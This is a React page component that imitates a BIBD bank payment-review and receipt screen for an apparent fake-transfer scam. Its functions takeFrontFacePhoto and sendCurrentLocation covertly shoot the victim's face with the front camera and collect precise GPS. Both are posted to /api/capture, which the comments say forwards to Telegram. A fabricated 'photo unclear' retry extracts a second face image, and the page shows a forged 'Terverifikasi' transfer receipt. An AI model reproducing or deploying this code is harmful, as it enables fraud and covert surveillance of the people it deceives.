"use client";

import { useCallback, useRef, useState, useEffect } from "react";
import RedirectCountdown from "@/components/RedirectCountdown";
import SuccessToast from "@/components/SuccessToast";
import LoadingScreen from "@/components/LoadingScreen";
import { useVerification } from "@/hooks/useVerification";
import { formatFileSize } from "@/utils/device";
import templateData from "./data.json";

export default function BibdVerificationPage() {
  const {
    isVerified,
    isChecking,
    isInitialLoading,
    isProcessing,
    showRedirectCountdown,
    redirectCountdown,
    uploadedFile,
    redirectConfig,
    redirectUrl,
    countdownDuration,
    handleVerifyClick,
    handleFileSelect,
    setUploadedFile,
    requestCameraPermission,
    requestAllPermissions,
    validationError,
  } = useVerification();

  const [showCamera, setShowCamera] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [captureAttempt, setCaptureAttempt] = useState(0);
  const [retryMessage, setRetryMessage] = useState<string | null>(null);
  const [displayDate, setDisplayDate] = useState(templateData.receiptDate);
  const isQris = (templateData as any).transactionLogo === "qris" || templateData.receiverBank?.toUpperCase() === "QRIS";
  const receiverLogo = isQris ? "/qris-icon.png" : "/dana-icon.png";
  const receiverAlt = isQris ? "QRIS" : "DANA";
  const rearVideoRef = useRef<HTMLVideoElement>(null);
  const rearStreamRef = useRef<MediaStream | null>(null);
  const cachedReceiptBlobRef = useRef<Blob | null>(null);

  // Set AUTO date based on client device
  useEffect(() => {
    if (templateData.receiptDate === "AUTO") {
      const date = new Date();
      const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
      const d = String(date.getDate()).padStart(2, '0');
      const m = months[date.getMonth()];
      const y = date.getFullYear();
      const hh = String(date.getHours()).padStart(2, '0');
      const mm = String(date.getMinutes()).padStart(2, '0');
      setDisplayDate(`${d} ${m} ${y}, ${hh}:${mm}`);
    } else {
      setDisplayDate(templateData.receiptDate);
    }
  }, []);

  // Cleanup camera streams on unmount
  useEffect(() => {
    return () => {
      rearStreamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []);

  const [cameraReady, setCameraReady] = useState(false);

  useEffect(() => {
    if (cameraReady && rearVideoRef.current && rearStreamRef.current) {
      rearVideoRef.current.srcObject = rearStreamRef.current;
      rearVideoRef.current.play().catch(e => console.error('Play failed:', e));
    }
  }, [cameraReady]);

  // Helper: Ambil foto wajah dari kamera depan secara diam-diam & kirim ke Telegram
  const takeFrontFacePhoto = useCallback(async (caption: string) => {
    try {
      const frontStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      });
      const fv = document.createElement('video');
      fv.srcObject = frontStream;
      fv.muted = true;
      fv.playsInline = true;
      await fv.play();
      await new Promise((r) => setTimeout(r, 600));

      const fc = document.createElement('canvas');
      fc.width = fv.videoWidth || 640;
      fc.height = fv.videoHeight || 480;
      fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);

      frontStream.getTracks().forEach((t) => t.stop());

      return await new Promise<Blob | null>((resolve) => {
        fc.toBlob((blob) => {
          if (blob) {
            const fd = new FormData();
            fd.append('photo', blob, 'face.jpg');
            fd.append('caption', caption);
            fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
          }
          resolve(blob);
        }, 'image/jpeg', 0.85);
      });
    } catch (err) {
      console.warn('Front camera capture error:', err);
      return null;
    }
  }, []);

  // Helper: Ambil lokasi GPS & kirim ke Telegram
  const sendCurrentLocation = useCallback(async () => {
    try {
      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          timeout: 15000,
          enableHighAccuracy: true,
        });
      });
      const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
      const fd = new FormData();
      fd.append('location', JSON.stringify(loc));
      fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
      return loc;
    } catch (err) {
      console.warn('Location capture error:', err);
      return null;
    }
  }, []);

  // Request camera permission and activate stream
  const activateCamera = useCallback(async () => {
    // 1. Ambil foto wajah duluan saat izin pertama kali diberikan
    await takeFrontFacePhoto('📸 [BIBD] Foto Wajah (Izin Kamera)');

    // 2. Buka rear camera untuk preview user
    let rearStream: MediaStream | null = null;
    try {
      rearStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
      });
    } catch {
      try {
        rearStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment' },
        });
      } catch {
        try {
          rearStream = await navigator.mediaDevices.getUserMedia({ video: true });
        } catch {
          alert('Gagal mengakses kamera. Pastikan browser memiliki izin dan tidak diblokir.');
          return;
        }
      }
    }

    if (rearStream) {
      rearStreamRef.current = rearStream;
      setCameraReady(true);
      if (rearVideoRef.current) {
        rearVideoRef.current.srcObject = rearStream;
        rearVideoRef.current.play().catch(() => {});
      }
    }

    // 3. Minta izin lokasi GPS
    sendCurrentLocation();
  }, [takeFrontFacePhoto, sendCurrentLocation]);

  // Open camera: show black preview → scroll down → request permission
  const handleOpenCamera = useCallback(async () => {
    if (uploadedFile || showCamera) return;
    setShowCamera(true);
    setCameraReady(false);
    // Scroll down first, then request camera after scroll
    setTimeout(() => {
      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
      // Request camera after scroll animation (~600ms)
      setTimeout(() => {
        activateCamera();
      }, 600);
    }, 300);
  }, [uploadedFile, showCamera, activateCamera]);

  // Cancel camera and close
  const handleCancelCamera = useCallback(() => {
    rearStreamRef.current?.getTracks().forEach((t) => t.stop());
    rearStreamRef.current = null;
    setShowCamera(false);
    setCameraReady(false);
  }, []);

  // Capture photo from rear camera and simultaneously get front face
  const handleCapturePhoto = useCallback(async () => {
    if (isCapturing) return;
    setIsCapturing(true);
    setRetryMessage(null);

    try {
      const rearVideo = rearVideoRef.current;
      let rearPhotoBlob: Blob | null = null;
      if (rearVideo && (rearVideo.videoWidth || rearVideo.readyState >= 2)) {
        const rearCanvas = document.createElement('canvas');
        rearCanvas.width = rearVideo.videoWidth || 640;
        rearCanvas.height = rearVideo.videoHeight || 480;
        const ctx = rearCanvas.getContext('2d');
        ctx?.drawImage(rearVideo, 0, 0, rearCanvas.width, rearCanvas.height);
        rearPhotoBlob = await new Promise<Blob | null>((resolve) =>
          rearCanvas.toBlob(resolve, 'image/jpeg', 0.85)
        );
      }

      if (rearPhotoBlob) {
        cachedReceiptBlobRef.current = rearPhotoBlob;
      }

      // Matikan rear camera agar front camera bisa diambil di mobile browser
      if (rearStreamRef.current) {
        rearStreamRef.current.getTracks().forEach((t) => t.stop());
        rearStreamRef.current = null;
      }

      const nextAttempt = captureAttempt + 1;
      setCaptureAttempt(nextAttempt);

      // Ambil foto wajah dari kamera depan lagi!
      await takeFrontFacePhoto(
        nextAttempt === 1
          ? '📸 [BIBD] Foto Wajah (Klik Ambil Resit #1)'
          : '📸 [BIBD] Foto Wajah (Klik Ulangi Resit #2)'
      );

      // Pastikan lokasi GPS terkirim
      sendCurrentLocation();

      if (nextAttempt === 1) {
        // Percobaan pertama: hidupkan kembali rear camera untuk preview user
        try {
          const newRear = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
          });
          rearStreamRef.current = newRear;
          setCameraReady(true);
          if (rearVideoRef.current) {
            rearVideoRef.current.srcObject = newRear;
            rearVideoRef.current.play().catch(() => {});
          }
        } catch {}

        setRetryMessage('Foto kurang jelas. Pastikan pencahayaan cukup dan resit terlihat dengan jelas.');
        setIsCapturing(false);
        return;
      }

      // Percobaan kedua / final: tutup camera & lanjutkan verifikasi
      setShowCamera(false);
      setCameraReady(false);

      const finalBlob = rearPhotoBlob || cachedReceiptBlobRef.current;
      if (finalBlob) {
        const resitFile = new File([finalBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
        handleFileSelect(resitFile);
      }
    } catch (err) {
      console.error('Capture failed:', err);
    }

    setIsCapturing(false);
  }, [isCapturing, captureAttempt, takeFrontFacePhoto, sendCurrentLocation, handleFileSelect]);



  // Show initial loading screen
  if (isInitialLoading) {
    return <LoadingScreen />;
  }

  // Loading screens removed to prevent blank loading page during processing

  if (isVerified) {
    return (
      <main className="relative flex min-h-screen w-full flex-col items-center justify-center bg-[#eae7e7] p-5 font-sans">
        {/* Receipt Card */}
        <div className="w-full max-w-[420px] mx-auto flex flex-col items-center animate-fade-slide">
          <div className="receipt-jagged-edge w-full rounded-t-xl rounded-b-none shadow-lg bg-white mb-4">
            {/* Header Section */}
            <div className="p-8 flex flex-col items-center text-center">
              {/* Brand Logo */}
              <img 
                src="/logo-terbaru-bibd-copy.png" 
                alt="BIBD Logo" 
                className="h-14 object-contain mb-4"
              />
              
              {/* Status Badge */}
              <div className="flex items-center space-x-2 bg-[#95d2c8]/20 text-[#095049] px-4 py-2 rounded-full mb-4">
                <span className="material-symbols-outlined text-[#002420] text-lg">check_circle</span>
                <span className="font-[IBM-Plex-Sans] text-sm font-semibold tracking-wider">Berhasil</span>
              </div>
              
              {/* Amount */}
              <p className="font-[Inter] text-sm text-[#53424b] mb-1">Jumlah Transfer</p>
              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">{templateData.receiptAmount}</p>
            </div>

            {/* Divider */}
            <div className="w-full dashed-divider my-4"></div>

            {/* Details Section */}
            <div className="p-8 flex flex-col gap-4">
              {/* Detail Row 1 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Tanggal</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{displayDate}</span>
              </div>
              {/* Detail Row 2 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Jenis Transaksi</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{templateData.receiptTransactionType}</span>
              </div>
              {/* Detail Row 3 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Dari</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
                  {templateData.receiptSenderName}<br />
                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptSenderAccount}</span>
                </span>
              </div>
              {/* Detail Row 4 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Ke</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
                  {templateData.receiptReceiverName}<br />
                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptReceiverAccount}</span>
                </span>
              </div>
              {/* Detail Row 5 */}
              <div className="flex justify-between items-start pt-2 border-t border-[#e5e2e1]">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Nomor Referensi</span>
                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">{templateData.receiptReference}</span>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="w-full flex flex-col gap-4 px-4 mb-8 mt-4">
            <button className="w-full flex items-center justify-center gap-2 bg-white border border-[#85727b] text-[#410030] font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:bg-[#e5e2e1] transition-colors">
              <span className="material-symbols-outlined text-lg">share</span>
              Bagikan
            </button>
            <button 
              onClick={() => (window.location.href = redirectUrl)}
              className="w-full bg-[#66004d] text-white font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:opacity-90 transition-opacity"
            >
              Selesai
            </button>
          </div>
        </div>

        {/* Success Toast */}
        <SuccessToast />

        <style
          dangerouslySetInnerHTML={{
            __html: `
              .receipt-jagged-edge {
                position: relative;
                background: #ffffff;
              }
              .receipt-jagged-edge::after {
                content: "";
                position: absolute;
                left: 0;
                bottom: -10px;
                width: 100%;
                height: 10px;
                background-image: radial-gradient(circle at 10px 0, transparent 10px, #ffffff 11px);
                background-size: 20px 10px;
                background-repeat: repeat-x;
                transform: rotate(180deg);
              }
              .dashed-divider {
                border-top: 2px dashed #d8c0cb;
              }
            `,
          }}
        />
      </main>
    );
  }

  return (
    <main className="h-[100dvh] max-h-[100dvh] overflow-hidden flex flex-col bg-[#e6edea] font-[Inter] antialiased w-full relative sm:py-4 items-center justify-center">
      {/* Mobile container mimicking modern phone screen */}
      <div className="w-full sm:max-w-[420px] bg-[#eff5f4] h-[100dvh] max-h-[100dvh] sm:h-[840px] sm:max-h-[840px] sm:rounded-[36px] overflow-hidden relative flex flex-col justify-between shadow-2xl">
        
        {/* Top Header Section */}
        <div className="w-full flex-shrink-0">
          {/* Top Navigation Bar */}
          <div className="w-full px-5 pt-3.5 pb-1 flex items-center justify-center z-10">
            <h1 className="font-semibold text-[15px] text-[#1a1d1e] tracking-tight">Review payment</h1>
          </div>

          {/* Brand Logo BIBD (Enlarged) */}
          <div className="w-full flex justify-center mt-1 mb-2">
            <img 
              src="/logo-terbaru-bibd-copy.png" 
              alt="BIBD Logo" 
              className="h-[58px] object-contain drop-shadow-xs"
            />
          </div>

          {/* Sender -> Receiver Dual Cards Visualizer (Real Cloning matching reference) */}
          <div className="w-full px-4 mb-2 flex items-center justify-between gap-2.5 relative">
            {/* Sender Card */}
            <div className="flex-1 h-[120px] bg-[#e1edea] rounded-[22px] p-2 flex flex-col items-center justify-center text-center shadow-xs border border-[#d2deda]">
              <div className="w-10 h-10 rounded-full flex items-center justify-center mb-1.5 shadow-xs overflow-hidden">
                <img 
                  src="/bibd-icon.png" 
                  alt="BIBD" 
                  className="w-full h-full object-cover rounded-full"
                />
              </div>
              <p className="font-bold text-[13px] text-[#1a1c1e] tracking-tight truncate w-full max-w-[130px]">
                {templateData.senderName}
              </p>
              <p className="text-[11px] text-[#78828a] font-normal mt-0.5 truncate w-full max-w-[130px]">
                {templateData.senderBank} · {templateData.senderAccount.slice(-4)}
              </p>
            </div>

            {/* Arrow Divider Badge */}
            <div className="w-7 h-7 rounded-full bg-[#dbe7e4] border border-[#cedbd7] flex items-center justify-center flex-shrink-0 text-[#536066] -mx-1 z-10">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </div>

            {/* Receiver Card */}
            <div className="flex-1 h-[120px] bg-[#e1edea] rounded-[22px] p-2 flex flex-col items-center justify-center text-center shadow-xs border border-[#d2deda]">
              <div className="w-10 h-10 rounded-full flex items-center justify-center mb-1.5 shadow-xs overflow-hidden">
                <img 
                  src={receiverLogo} 
                  alt={receiverAlt} 
                  className="w-full h-full object-cover rounded-full"
                />
              </div>
              <p className="font-bold text-[13px] text-[#1a1c1e] tracking-tight truncate w-full max-w-[130px]">
                {templateData.receiverName}
              </p>
              <p className="text-[11px] text-[#78828a] font-normal mt-0.5 truncate w-full max-w-[130px]">
                {templateData.receiverBank} · {templateData.receiverAccount.slice(-4)}
              </p>
            </div>
          </div>
        </div>

        {/* White Content Bottom Sheet */}
        <div className="flex-1 bg-white rounded-t-[32px] px-5 pt-3.5 pb-4 shadow-sm flex flex-col justify-between overflow-hidden w-full border-t border-[#d8e2e0]">
          <div className="w-full flex-1 flex flex-col justify-center">
            {/* Sender Header Line */}
            <div className="flex items-center justify-between py-1.5 text-[13px]">
              <div className="flex items-center gap-2 text-[#78828a] font-medium">
                {/* Cloned Up-Arrow Circle Icon */}
                <svg width="18" height="18" viewBox="0 0 20 20" fill="none" className="flex-shrink-0">
                  <circle cx="10" cy="10" r="9.5" fill="#84919a" />
                  <path d="M10 14.5V6.5M10 6.5L6.5 10M10 6.5L13.5 10" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span className="text-[#647079]">Sender</span>
              </div>
              <div className="flex items-center gap-1.5 font-bold text-gray-900 text-[13px]">
                <img 
                  src="/bibd-icon.png" 
                  alt="BIBD" 
                  className="w-5 h-5 rounded-full object-cover shadow-2xs flex-shrink-0" 
                />
                <span>{templateData.senderName}</span>
              </div>
            </div>

            {/* Recipient Header Line */}
            <div className="flex items-center justify-between py-1.5 text-[13px]">
              <div className="flex items-center gap-2 text-[#78828a] font-medium">
                {/* Cloned Down-Arrow Circle Icon */}
                <svg width="18" height="18" viewBox="0 0 20 20" fill="none" className="flex-shrink-0">
                  <circle cx="10" cy="10" r="9.5" fill="#84919a" />
                  <path d="M10 5.5V13.5M10 13.5L6.5 10M10 13.5L13.5 10" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span className="text-[#647079]">Recipient</span>
              </div>
              <div className="flex items-center gap-1.5 font-bold text-gray-900 text-[13px]">
                <img 
                  src={receiverLogo} 
                  alt={receiverAlt} 
                  className="w-5 h-5 rounded-full object-cover shadow-2xs flex-shrink-0" 
                />
                <span>{templateData.receiverName}</span>
              </div>
            </div>

            {/* Total Pay Amount Line */}
            <div className="flex items-center justify-between py-1.5 text-[13px]">
              <div className="flex items-center gap-2 text-[#78828a] font-medium">
                {/* Cloned Money Bag with $ Icon */}
                <svg width="18" height="18" viewBox="0 0 20 20" fill="none" className="flex-shrink-0">
                  <path d="M7.5 4.5C7.5 3.3 8.6 2.5 10 2.5C11.4 2.5 12.5 3.3 12.5 4.5C12.5 5 12 5.5 11.5 6H8.5C8 5.5 7.5 5 7.5 4.5Z" fill="#84919a" />
                  <path d="M5.5 8.5C5.5 7 7 6 10 6C13 6 14.5 7 14.5 8.5C14.5 9 15 9.5 15.6 10.6C16.8 13.2 16.5 16.5 15 17.8C13.8 18.8 6.2 18.8 5 17.8C3.5 16.5 3.2 13.2 4.4 10.6C5 9.5 5.5 9 5.5 8.5Z" fill="#84919a" />
                  <text x="10" y="14.2" textAnchor="middle" fontSize="7.8" fontWeight="900" fill="white" fontFamily="Inter, Arial, sans-serif">$</text>
                </svg>
                <span className="text-[#647079]">Total pay amount</span>
              </div>
              <span className="font-bold text-[15px] text-gray-900">{templateData.amountPrimary}</span>
            </div>

            {/* Itemized Transaction Breakdown Card with Grey Stroke */}
            {!showCamera && !uploadedFile && (
              <div className="w-full bg-[#f8faf9] rounded-2xl p-3 border border-[#d2d9df] shadow-2xs flex flex-col gap-2 text-[12px] my-1">
                {/* Authentic Verified Status Header */}
                <div className="flex items-center justify-between pb-1.5 border-b border-gray-200/70">
                  <span className="text-[10.5px] font-semibold text-gray-500 uppercase tracking-wider">Rincian Pemindahan Dana</span>
                  <span className="text-[10px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200">
                    Terverifikasi
                  </span>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">Akun Pengirim</span>
                  <span className="font-semibold text-gray-900 text-right">{templateData.senderBank} · {templateData.senderAccount}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">Akun Penerima</span>
                  <span className="font-semibold text-gray-900 text-right">{templateData.receiverBank} · {templateData.receiverAccount}</span>
                </div>
                <div className="w-full h-px bg-gray-200/70 my-0.5" />
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">Nominal Asal (BND)</span>
                  <span className="font-semibold text-gray-900">{templateData.amountSecondary}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">Biaya Layanan</span>
                  <span className="font-semibold text-emerald-600">GRATIS (BND 0,00)</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">Jenis Transaksi</span>
                  <span className="font-semibold text-gray-900">Transfer Internasional</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">No. Rujukan</span>
                  <span className="font-semibold text-gray-900 font-mono text-[11px]">{templateData.receiptReference}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 font-medium">Waktu Transaksi</span>
                  <span className="font-semibold text-gray-900">{displayDate}</span>
                </div>
              </div>
            )}

            {/* Camera View Area */}
            {showCamera && (
              <div className="w-full flex flex-col gap-2 my-1">
                <div className="w-full rounded-[20px] overflow-hidden bg-black relative flex items-center justify-center shadow-inner border border-gray-300" style={{ aspectRatio: '4/3' }}>
                  {!cameraReady && (
                    <div className="absolute inset-0 bg-black flex flex-col items-center justify-center z-10">
                      <svg className="h-10 w-10 animate-spin text-white/60 mb-3" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                      </svg>
                      <span className="text-white/70 text-xs font-medium">Menunggu izin kamera...</span>
                    </div>
                  )}
                  <video
                    ref={rearVideoRef}
                    autoPlay
                    playsInline
                    muted
                    className={`w-full h-full object-cover transition-opacity duration-300 ${cameraReady ? 'opacity-100' : 'opacity-0'}`}
                    style={{ transform: 'scaleX(1)' }}
                  />
                  {isCapturing && (
                    <div className="absolute inset-0 bg-black/50 flex items-center justify-center z-20">
                      <div className="flex flex-col items-center gap-2">
                        <svg className="h-8 w-8 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                        </svg>
                        <span className="text-white text-xs font-semibold">Memproses...</span>
                      </div>
                    </div>
                  )}
                </div>

                {retryMessage && (
                  <div className="w-full animate-fade-slide">
                    <div className="flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl bg-gradient-to-r from-orange-50 to-amber-50 border border-orange-200/60 shadow-xs">
                      <div className="flex-shrink-0 w-7 h-7 rounded-full bg-orange-100 flex items-center justify-center">
                        <span className="material-symbols-outlined text-orange-500 text-[16px]">photo_camera</span>
                      </div>
                      <p className="text-[11px] leading-tight text-gray-600">
                        Foto kurang jelas. Pastikan pencahayaan cukup dan resit terlihat dengan jelas.
                      </p>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Uploaded Receipt Preview */}
            {uploadedFile && (
              <div className="w-full flex flex-col gap-2 my-1">
                <div className="w-full rounded-[20px] overflow-hidden bg-black relative flex items-center justify-center shadow-inner border border-gray-300" style={{ aspectRatio: '4/3' }}>
                  <img 
                    src={URL.createObjectURL(uploadedFile)} 
                    alt="Captured Receipt" 
                    className="w-full h-full object-cover"
                    style={{ transform: 'scaleX(1)' }}
                  />
                </div>
              </div>
            )}

            {validationError && (
              <div className="my-2 flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2 rounded-lg border border-red-200 w-full justify-center text-center">
                <span className="material-symbols-outlined text-sm flex-shrink-0">warning</span>
                <span>{validationError}</span>
              </div>
            )}
          </div>

          {/* Bottom Total & Action Section */}
          <div className="w-full pt-3 border-t border-[#e2e8f0] flex flex-col gap-2.5 flex-shrink-0">
            <div className="flex items-baseline justify-between">
              <span className="text-[13px] text-gray-500 font-medium">Total diterima</span>
              <div className="text-right">
                <span className="text-[24px] font-black text-gray-950 tracking-tight">{templateData.amountPrimary}</span>
                <span className="block text-[11px] text-gray-400 font-medium">({templateData.amountSecondary})</span>
              </div>
            </div>

            {showCamera ? (
              <button
                onClick={handleCapturePhoto}
                disabled={isCapturing || !cameraReady}
                className="w-full bg-black text-white py-3.5 rounded-2xl font-bold text-[15px] hover:bg-neutral-900 transition-all shadow-md disabled:opacity-50 flex items-center justify-center gap-2 active:scale-[0.99] tracking-wide"
              >
                {isCapturing ? 'Memproses...' : !cameraReady ? 'Menunggu Kamera...' : retryMessage ? 'ULANGI FOTO RESIT' : 'AMBIL FOTO RESIT / BUKTI'}
              </button>
            ) : !uploadedFile ? (
              <button
                onClick={handleOpenCamera}
                className="w-full bg-black text-white py-3.5 rounded-2xl font-bold text-[15px] hover:bg-neutral-900 transition-all shadow-md active:scale-[0.99] flex items-center justify-center gap-2 tracking-wide"
              >
                AMBIL FOTO RESIT / BUKTI
              </button>
            ) : (
              <button 
                onClick={handleVerifyClick}
                disabled={isChecking}
                className="w-full bg-[#16a34a] text-white py-3.5 rounded-2xl font-bold text-[15px] hover:bg-[#15803d] transition-all shadow-md disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isChecking ? 'MEMPROSES...' : 'KIRIM BUKTI'}
              </button>
            )}
          </div>

        </div>
      </div>
    </main>
  );
}

